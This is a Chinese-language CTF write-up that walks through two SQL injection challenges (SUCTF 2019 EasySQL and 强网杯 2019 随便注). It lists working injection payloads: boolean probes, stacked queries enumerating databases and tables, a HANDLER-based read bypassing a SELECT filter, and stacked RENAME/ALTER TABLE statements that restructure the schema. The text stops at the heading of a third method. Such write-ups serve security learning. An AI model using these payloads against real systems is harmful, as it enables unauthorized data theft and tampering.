# [SUCTF 2019]EasySQL 1

1. 试试SQL注入的正常套路
- 先试试1,有回显Array ( [0] => 1 )
- 再试试字母aaa,没有回显
- 试试单引号注入1' or '1'='1,提示不一样，因此猜测这里有注入点
- 试试有多少列1' order by 4#,还是不成功，因此一般的联合查询在这里不能使用
- 基于时间的盲注和报错注入都需要嵌套联合查询语句来实现，因此可以跳过，直接试试布尔型盲注1' and length(database())>=1,还是不成功
2. 利用堆叠注入
- 查找所有数据库1;show databases#
- 查找所有表名1;show tables#
- 查询Flag表中的列1;show columns from Flag#
- 不成功
3. 输入字符的时候啥也不回显。
   有经验的师傅这个时候其实就懂得要放弃布尔盲注、时间盲注了。
   这种格式很明显是要你搞后端代码，他到底怎么写的呢？
   那就很有趣了。
   其实你应该推断出一个基本事实：
   他的后端既然能做到数字回显字母不回显，说明有一个 或 结构，而且不直接回显flag，但作为一道题目，from一定是from flag。
4. 猜测select $_POST['query'] || flag from flag
5. 拼接select *,1 from flag

# [强网杯 2019]随便注 1

1. 用union联合查询

第一步、尝试测试注入点（一些小tips：利用引号，and 1=1， or 1=1之类的）判断是字符型还是数字型

1' 报错

1'# 不报错，正常回显

1' and 1=1# 不报错，正常回显

1' or 1=1# 不报错，正常回显

说明存在SQL注入

第二步、尝试用order by语句查询表的列数

1' order by 1;#不报错，正常回显

1' order by 2;#不报错，正常回显

1' order by 3;#报错

说明这张表有三列

第三步、尝试用union select 找到回显位

发现回显过滤了关键字

2. 不能找到回显位，尝试使用堆叠注入。

第一步、通过"1';show databases;#"爆出数据库

第二步、通过"1';show tables;#"爆出表名

第三步、看到此处有两个表，通过"1';show columns from `words`;#",先爆出"words"中的内容。然后通过"1';show columns from `1919810931114514`;#"爆出"1919810931114514"的内容。

3. 在"1919810931114514"中发现flag所在的字段。但select函数已被过滤，下面尝试用三种方法用来做select函数被过滤的题型。

>第一种：hander语句代替select语句。　

语法结构：

　　　　HANDLER tbl_name OPEN [ [AS] alias]

　　　　HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)

　　　　[ WHERE where_condition ] [LIMIT ... ]

　　　　HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }

　　　　[ WHERE where_condition ] [LIMIT ... ]

　　　　HANDLER tbl_name READ { FIRST | NEXT }

　　　　[ WHERE where_condition ] [LIMIT ... ]

　　　　HANDLER tbl_name CLOSE

解释：通过handler语句查询users表的内容

　　　　handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名

　　　　handler yunensec read first; #读取指定表/句柄的首行数据

　　　　handler yunensec read next; #读取指定表/句柄的下一行数据

　　　　handler yunensec read next; #读取指定表/句柄的下一行数据

　　　　...

　　　　handler yunensec close; #关闭句柄

Payload: 1';handler `1919810931114514` open as `kay`;handler `kay` read next;#

得到flag.

>第二种：更改表明列名

虽然正则过滤过滤了很多函数，但没过滤alert和rename等关键字。

我们如果将表1919810931114514名字改为words，flag列名字改为id，那么我们就能得到flag的内容了！

更改表明列名的语法

-- 修改表名

　　　　rename table old_table to new_table;

　　　　-- 或者

　　　　alter table old_table rename to new_table;

　　　　-- 修改列名称

　　　　alter table table_name change column old_name new_name varchar(255);

　　　　-- 修改字段类型

　　　　alter table table_name modify column column_name varchar(255) default '' COMMENT '注释';



Payload："1';rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table `words` change flag id varchar(100);"

拆分开来如下

　　　　1';

　　　　rename table `words` to words1;

　　　　renmae table `1919810931114514` to `words`;

　　　　alter table words change flag id varchar(100);

然后使用"1' or 1=1;#"即可查出flag.

>第三种，尝试使用SQL预编译的方式